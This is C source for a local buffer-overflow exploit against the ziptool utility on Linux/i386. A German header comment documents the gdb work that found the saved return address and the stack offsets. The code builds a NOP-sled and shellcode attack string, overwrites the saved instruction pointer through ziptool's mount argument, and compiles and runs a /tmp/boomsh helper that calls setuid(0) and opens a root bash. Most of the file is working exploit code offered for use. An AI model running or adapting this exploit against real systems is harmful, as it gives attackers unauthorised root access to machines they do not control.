/*
** Local Exploit for ziptool (Linux/i386)
** Thomas Biege 
**
** Thanks to Sek to guide me through this. :-)
**
** Usage: zipzap
**
**  * Linux:
**    berechnet = 228 Bytes platz
**    praktisch = 218 Bytes
**
** step-by-step HowTo:

1. Wert des gesicherten IP:
---------------------------
tom@otu:/cryptofs/Bug-Research-Lab/Exploits/ziptool/ziptool-1.3> gdb ./ziptool
GNU gdb 20010316
Copyright 2001 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-suse-linux"...
(gdb) break jaz
jaz_models          jazip_ctrldoor      jazip_ctrlspin      jazip_eject         jazip_get_password  jazip_usage
jazip_check_dev     jazip_ctrlmount     jazip_display_mode  jazip_get_mode      jazip_set_mode
(gdb) break jazip_ctrlmount
Breakpoint 1 at 0x80489a9: file ziptool.c, line 165.
(gdb) r -m /dev/sdc $(perl -e 'print "A" x 300')
Starting program: /cryptofs/Bug-Research-Lab/Exploits/ziptool/ziptool-1.3/./ziptool -m /dev/sdc $(perl -e 'print "A" x 300')
Mounting /dev/sdcØïÿ¿øïÿ¿îG@4 on AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, jazip_ctrlmount (jazipfd=134526700, oper=1, dev=0xbfffefb0 "/dev/sdcØïÿ¿øïÿ¿îG\005@\0044",
    mnt=0xbffff23c 'A' <repeats 200 times>...) at ziptool.c:165
165             bzero(cmd, 255);
(gdb) bt
#0  jazip_ctrlmount (jazipfd=134526700, oper=1, dev=0xbfffefb0 "/dev/sdcØïÿ¿øïÿ¿îG\005@\0044",
    mnt=0xbffff23c 'A' <repeats 200 times>...) at ziptool.c:165
#1  0x08049ac9 in main (argc=13316, argv=0xbffff024) at ziptool.c:859
#2  0x400547ee in __libc_start_main () from /lib/libc.so.6

-> #1 ist der wert von saved_ip


2. Groesse des Stack-Frames:
----------------------------
(gdb) disassemble jazip_ctrlmount
Dump of assembler code for function jazip_ctrlmount:
0x80489a0 <jazip_ctrlmount>:    push   %ebp
0x80489a1 <jazip_ctrlmount+1>:  mov    %esp,%ebp
0x80489a3 <jazip_ctrlmount+3>:  sub    $0x118,%esp

-> 0x118 = 280, also nicht 228 oder dergleichen

0x118 wird anscheinend als Standardwert bei gcc genommen!


3. Offset zu saved_ip durch patchen der ziptool Sourcen:
--------------------------------------------------------
printf("-> %p <-\n", *((long*)&cmd[0x118-<brute force>]));

<brute force> anpassen bis saved_ip (0x08049ac9) gefunden ist

Der Index wurde durch Brute-Force gefunden:
jazip_ctrlmount ( int jazipfd, int oper, char *dev, char *mnt)
{
	int   result;
	char  cmd[255];
  long  *ret = (long *)&result + 2L;
  int   i;

		
	bzero(cmd, 255);

#define BRUTE 260+8   //0x118+8

  for(i = 0; i < 0x118; i++)
    if( *((long*)&cmd[0x118-i]) == *ret)
      break;

  if(i == 0x118)
    printf("-> not found\n");
  else
    printf("-> cmd[0x118-%d]: 0x%0.4x | ret: Ox%0.4x <-\n", i, *((long*)&cmd[0x118-i]), *ret );
[...]

tom@otu:/cryptofs/Bug-Research-Lab/Exploits/ziptool/ziptool-1.3> make;./ziptool -m $(perl -e 'printf "/dev/sdc1\0"') $(perl -e 'print "A" x 2')
gcc -ggdb -DEXPLOIT -I/usr/src/linux/include -o ziptool ziptool.c
Mounting /dev/sdc
-> cmd[0x118-16]: 0x8049ba9 | gdb: 0x08049af9 | ret: Ox8049ba9 <-
[...]

Bei cmd+264 befindet sich also unsere Ruecksprungadresse. :-)

Frage: Warum befindet sich die RET in unserem lokalen Stack-Frame???
Das ist nicht der lokale Stack-Frame, da GCC den Stack-Frame wieder
verkleinert o.ae.. (s. Optimierungen)


4. Errechnen der Laenge des Attack-Strings:
-------------------------------------------

264 - 4 (saved_bp) - 4 (saved_ip) - 42 (strlen of cmd) = 214 Bytes

[/bin/mount -t ext2 /dev/sdc<trash>][    NOP    ][  Shellcode  ][saved_BP][saved_IP]
<--------------- 42 ---------------><---------- 214 -----------><-- 04 --><-- 04 -->
<--------------------------------------- 264 -------------------------------------->


5. Neue Ruecksprungadresse:
---------------------------
printf("-> cmd[0x118-%d]: 0x%0.4x | ret: Ox%0.4x | &cmd[20]: Ox%0.4x <-\n", i, *((long*)&cmd[0x118-i]), *ret, &cmd[20]);

-> cmd[0x118-16]: 0x8049ba9 | ret: Ox8049ba9 | &cmd[20]: Oxbfffefbc <-

Die neue Returnadresse ist also Oxbfffefbc.

Wir wollen nicht direkt an den Anfang des Puffers springen um Eventualitaeten aus dem Weg zu gehen. ;-)

*/


#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "errormsg.h"
#include "zipzap.h"


#define MOUNT_CMD     "/bin/mount"

#define MAXBUF        1024
#define CMDOPT        "dvhp:s:a:"
#define CMDSTR        "[-d] [-v] [-h] -p <path> -s <special file> -a <allgin> \n"\
                      "\t-d debug\n"\
                      "\t-h print this screen\n" \
                      "\t-v verbose\n"\
                      "\t-p path to ziptool (i.e. /usr/bin/ziptool)\n" \
                      "\t-a allignment (i.e. 4 for 32 bit arch; 8 for 64 bit arch)\n" \
                      "\t-s special/device file (i.e. /dev/zip100)\n"

#define USAGE(pname)  err_mesg(FATAL, "usage:\n%s %s\n", pname, CMDSTR);


// Globals
char  *pname;

char  *shellcode      = stealth_code;

u_int path_flag       = 0,
      debug_flag      = 0,
      verbose_flag    = 0,
      allign_flag     = 0,
      special_flag    = 0;

char  *path_val,
      *special_val;

u_int allign_val;



// Declare Functions & Types
struct sc_info
{
  u_int lenNOP;
  u_int lenShellcode;
  u_int lenOffset;
};

#define SHELLCODELEN  ((u_long) (0x118 - 16 - 50))   // 42 strlen(cmd) right before vul. strncpy()
                                                     // 50 by manual brute-forcing till cmd[0x118-16] becomes &cmd[111]
#define BUFRET        ((u_long) (0xbffffd17))        // found by patching ziptool

// We use Attribute 'packed' to force the smallest Allignment to avoid holes.
typedef struct
{
  // local Variables
  char    cmd[SHELLCODELEN]   __attribute__ ((packed));
  int     result              __attribute__ ((packed));
  // saved CPU Register
  u_long  saved_bp            __attribute__ ((packed));
  u_long  saved_ip            __attribute__ ((packed));
  u_char  null                __attribute__ ((packed));
} targetStack;


int             attackLocal(char *path, char *device, u_int allign, u_long ret, u_int length);
int             creatBoomShell(void);
struct sc_info buildAttackString(targetStack *target_stack, size_t attack_str_len, u_int allign, u_long ret);
u_long          hexMask(u_char *mask, u_long *hex_stub);
u_long          getStackPointer(void);



/****************************************************************************************************************
**   M A I N
*****************************************************************************************************************/
int main(int argc, char *argv[])
{
  int   opt;

  pname = argv[0];


  if(argc == 1)
    USAGE(pname)


  /*
  ** Get Options
  */
  opterr = 0;
  while((opt = getopt(argc, argv, CMDOPT)) != EOF)
  {
    switch(opt)
    {
      case 'd':
        debug_flag++;
        break;
      case 'p':
        if(optarg == NULL)
          goto DEFAULT;
        path_flag++;
        path_val = strdup(optarg);
        break;
      case 'a':
        if(optarg == NULL)
          goto DEFAULT;
        allign_flag++;
        allign_val = (u_int) atoi(optarg);
        break;
      case 's':
        if(optarg == NULL)
          goto DEFAULT;
        special_flag++;
        special_val = strdup(optarg);
        break;
      case 'v':
        verbose_flag++;
        break;
      DEFAULT:
        printf("Missing argument for -%c\n", opt);
      default:
        USAGE(pname)
    }
  }


  // XXX check arguments

  attackLocal(path_val, special_val, allign_val, BUFRET, SHELLCODELEN);


  exit(0);
}


/**********************************************************************************************************
** SUBROUTINES
**********************************************************************************************************/

/*
** Attack Functions
*/
int attackLocal(char *path, char *device, u_int allign, u_long ret, u_int length)
{
  targetStack       stack;
  char              *a[] =
                    {
                      path,
                      "-m",
                      device,
                      ( (char *) &stack),
                      NULL
                    };
  int               status;
  pid_t             pid;
  struct sc_info   sci;


  if(debug_flag)
    err_mesg(WARN, "attackLocal: create Boom Shell\n");

  createBoomShell();

  if(debug_flag)
    err_mesg(WARN, "attackLocal: build Attack Vector\n");

  sci = buildAttackString(&stack, (size_t) length, allign, BUFRET);

  if(debug_flag)
    err_mesg(WARN, "attackLocal: Attack-Str. Length: %u\n", length);

  // if debug print attack string
  if(debug_flag > 1)
  {
    printf("Attack Vector (%d): [NOP (0x%0x) = %d][Shellcode (XYZ) = %d Bytes][Offset (0x%0x) = %d Bytes]\n",
    strlen(stack.cmd), *((long *)nop), sci.lenNOP, sci.lenShellcode, ret, sci.lenOffset);
  }

  if(debug_flag)
    err_mesg(WARN, "attackLocal: %s %s %s %s\n", a[0], a[1], a[2], a[3]);

  if( (pid = fork()) < 0)
  {
    err_mesg(WARN_SYS, "attackLocal: Error: frok() | Syserror");
    return(-2);
  }
  else if(pid == 0) // Child
    exit(execve(path, a, NULL));
  else
  {
    waitpid(pid, &status, 0);
    if(debug_flag)
      err_mesg(WARN, "attackLocal: Execute Boom Shell (/tmp/boomsh)\n");
    system("/tmp/boomsh");
  }

  return(0);
}

int createBoomShell(void)
{
  char  *sourceCode  = "#include <unistd.h>\n\n"\
                       "int main(void)\n"\
                       "{\n"\
                       "\tsetuid(0);\n"\
                       "\tsystem(\"/bin/bash --norc --noprofile\");\n"\
                       "\texit(0);\n"\
                       "}\n";
  FILE  *boomShell;

  if( (boomShell = fopen("/tmp/boomsh.c", "w+")) == NULL)
    err_mesg(FATAL_SYS, "Error: fopen(/tmp/boomsh.c) | Syserror");

  fprintf(boomShell, sourceCode);

  fclose(boomShell);

  system("cc -o /tmp/boomsh /tmp/boomsh.c");

  return(0);
}


struct sc_info buildAttackString(targetStack *target_stack, size_t attack_str_len, u_int allign, u_long ret)
{
  int               Cnt;
  struct sc_info   sci;


  sci.lenShellcode  = strlen(shellcode);
  sci.lenOffset     = allign;   // we just write the offset once (4 bytes)
  sci.lenNOP        = attack_str_len - sci.lenShellcode;

  memset(target_stack, (u_char) 0x90, attack_str_len);
  memcpy(&target_stack->cmd[sci.lenNOP-1], shellcode, sci.lenShellcode);
  target_stack->result    = 0x55667788;
  target_stack->saved_bp  = 0x11223344;
  target_stack->saved_ip  = ret;
  target_stack->null      = '\0';

  if(debug_flag > 2)
  {
    puts("Attack String:");
    for(Cnt = 0; Cnt <= attack_str_len; Cnt++)
    {
       if(!(Cnt % 10))
         printf("\n%0.4d: ", Cnt+1);
       printf("0x%0.2X ", target_stack->cmd[Cnt]);
    }
    puts("\n\n");
  }

  return(sci);
}
